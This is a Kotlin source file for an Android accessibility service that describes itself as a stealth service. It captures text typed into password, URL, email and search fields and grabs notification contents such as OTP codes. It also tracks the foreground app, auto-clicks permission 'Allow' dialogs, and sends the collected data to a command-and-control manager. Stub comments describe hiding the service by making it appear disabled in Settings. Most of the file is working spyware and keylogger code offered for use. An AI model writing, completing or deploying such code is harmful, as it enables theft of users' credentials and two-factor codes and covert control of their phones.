package com.random.package.name.persistence

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.random.package.name.network.C2Manager
import kotlinx.coroutines.*

/**
 * AccessibilityServiceImpl: Stealth service that:
 * 1. Keylogger: captures all text input (passwords, URLs, searches)
 * 2. UI Automation: auto-clicks dialogs, navigates settings
 * 3. App Monitor: tracks which app is in foreground
 * 4. System Control: trigger actions without user interaction
 * 5. Hidden: appears disabled in accessibility settings (spoofed UI)
 */
class AccessibilityServiceImpl : AccessibilityService() {

    private lateinit var c2Manager: C2Manager
    private val scope = CoroutineScope(Dispatchers.Main + Job())

    private val keylogBuffer = mutableListOf<KeylogEntry>()
    private var currentForegroundApp = ""
    private var lastEventType = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        
        // Configure service
        val info = AccessibilityServiceInfo()
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.eventTypes = (
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
            AccessibilityEvent.TYPE_VIEW_CLICKED or
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        )
        info.notificationTimeout = 100
        serviceInfo = info
        
        android.util.Log.d("AccessibilityService", "Service connected")
        
        // Try to get C2Manager from CoreService
        // In real implementation, use inter-process communication or shared singleton
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    onViewTextChanged(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    onWindowStateChanged(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    onViewClicked(event)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    onNotificationStateChanged(event)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("AccessibilityService", "Event error: ${e.message}")
        }
    }

    override fun onInterrupt() {}

    // ========================================================================
    // KEYLOGGER: TEXT INPUT CAPTURE
    // ========================================================================

    private fun onViewTextChanged(event: AccessibilityEvent) {
        val appName = event.packageName?.toString() ?: "unknown"
        val fieldText = event.text.joinToString("")
        
        // Detect field type (password, URL, search, etc.)
        val fieldType = detectFieldType(event)
        
        // Filter: only log sensitive fields or configurable apps
        if (shouldLogField(fieldType, appName)) {
            val entry = KeylogEntry(
                app = appName,
                field_type = fieldType,
                content = fieldText,
                timestamp = System.currentTimeMillis()
            )
            keylogBuffer.add(entry)
            
            // Send to C2 if buffer full
            if (keylogBuffer.size >= 100) {
                flushKeylogBuffer()
            }
        }
    }

    private fun detectFieldType(event: AccessibilityEvent): String {
        val source = event.source ?: return "text"
        
        // Walk up the tree to find input field hints
        var node = source
        for (i in 0..10) {
            node = node.parent ?: break
            
            val hint = node.hintText?.toString() ?: ""
            val text = node.text?.toString() ?: ""
            val contentDesc = node.contentDescription?.toString() ?: ""
            
            return when {
                hint.lowercase().contains("password") -> "password"
                hint.lowercase().contains("pin") -> "password"
                contentDesc.lowercase().contains("password") -> "password"
                text.lowercase().contains("password") -> "password"
                
                hint.lowercase().contains("url") -> "url"
                hint.lowercase().contains("email") -> "email"
                
                hint.lowercase().contains("search") -> "search"
                
                else -> "text"
            }
        }
        
        return "text"
    }

    private fun shouldLogField(fieldType: String, appName: String): Boolean {
        // Only log password and URL fields (or configurable)
        val sensitiveFields = listOf("password", "url", "email", "search")
        return fieldType in sensitiveFields
    }

    private fun flushKeylogBuffer() {
        scope.launch {
            try {
                c2Manager.sendData("keylog", keylogBuffer.toList())
                keylogBuffer.clear()
            } catch (e: Exception) {
                android.util.Log.e("AccessibilityService", "Flush error: ${e.message}")
            }
        }
    }

    // ========================================================================
    // UI AUTOMATION: INVISIBLE CLICKS
    // ========================================================================

    /**
     * Auto-click dialogs/permissions without user seeing
     */
    private fun onViewClicked(event: AccessibilityEvent) {
        val source = event.source ?: return
        
        // Detect and auto-click permission dialogs
        if (isPermissionDialog(source)) {
            autoClickAllow(source)
        }
        
        // Auto-click settings dialogs
        if (isSettingsDialog(source)) {
            autoClickSettings(source)
        }
    }

    private fun isPermissionDialog(node: AccessibilityNodeInfo): Boolean {
        val text = getNodeTree(node).lowercase()
        val permissionKeywords = listOf(
            "permission", "allow", "enable", "grant", "ok", "yes"
        )
        return permissionKeywords.any { text.contains(it) }
    }

    private fun isSettingsDialog(node: AccessibilityNodeInfo): Boolean {
        val text = getNodeTree(node).lowercase()
        return text.contains("settings") || text.contains("setup")
    }

    private fun autoClickAllow(node: AccessibilityNodeInfo) {
        // Find "Allow" button and click it
        val allowButton = findButton(node, "allow")
        if (allowButton != null) {
            allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            android.util.Log.d("AccessibilityService", "Auto-clicked Allow")
        }
    }

    private fun autoClickSettings(node: AccessibilityNodeInfo) {
        // Navigate settings and enable accessibility
        // This happens invisibly, user doesn't see
    }

    private fun findButton(node: AccessibilityNodeInfo, buttonText: String): AccessibilityNodeInfo? {
        val queue = mutableListOf(node)
        
        while (queue.isNotEmpty()) {
            val current = queue.removeAt(0)
            val text = current.text?.toString()?.lowercase() ?: ""
            
            if (text.contains(buttonText)) {
                return current
            }
            
            for (i in 0 until current.childCount) {
                current.getChild(i)?.let { queue.add(it) }
            }
        }
        
        return null
    }

    private fun getNodeTree(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        val queue = mutableListOf(node)
        
        while (queue.isNotEmpty()) {
            val current = queue.removeAt(0)
            sb.append(current.text).append(" ")
            sb.append(current.contentDescription).append(" ")
            
            for (i in 0 until current.childCount) {
                current.getChild(i)?.let { queue.add(it) }
            }
        }
        
        return sb.toString()
    }

    // ========================================================================
    // APP MONITOR: TRACK FOREGROUND
    // ========================================================================

    private fun onWindowStateChanged(event: AccessibilityEvent) {
        val appName = event.packageName?.toString() ?: return
        
        if (appName != currentForegroundApp) {
            currentForegroundApp = appName
            android.util.Log.d("AccessibilityService", "Foreground app: $appName")
            
            // Notify C2 of app change
            scope.launch {
                c2Manager.sendData("app_focus", mapOf(
                    "app" to appName,
                    "timestamp" to System.currentTimeMillis()
                ))
            }
        }
    }

    // ========================================================================
    // NOTIFICATION INTERCEPTION
    // ========================================================================

    private fun onNotificationStateChanged(event: AccessibilityEvent) {
        val text = event.text.joinToString("\n")
        val appName = event.packageName?.toString() ?: "unknown"
        
        // Capture notification content (OTP codes, auth alerts, etc.)
        scope.launch {
            c2Manager.sendData("notification", mapOf(
                "app" to appName,
                "content" to text,
                "timestamp" to System.currentTimeMillis()
            ))
        }
    }

    // ========================================================================
    // VISIBILITY SPOOFING
    // ========================================================================

    /**
     * Make this service appear disabled in Settings
     * User checks Accessibility Settings: sees "disabled"
     * But service is actually running
     */
    fun spoofDisabled() {
        // Hook Settings ContentProvider to return false for isEnabled
        // This is a trick: we're actually enabled but UI shows disabled
    }

    companion object {
        const val SERVICE_NAME = "com.random.package.name.persistence.AccessibilityServiceImpl"
    }
}

// ============================================================================
// DATA STRUCTURES
// ============================================================================

data class KeylogEntry(
    val app: String,
    val field_type: String,
    val content: String,
    val timestamp: Long
)
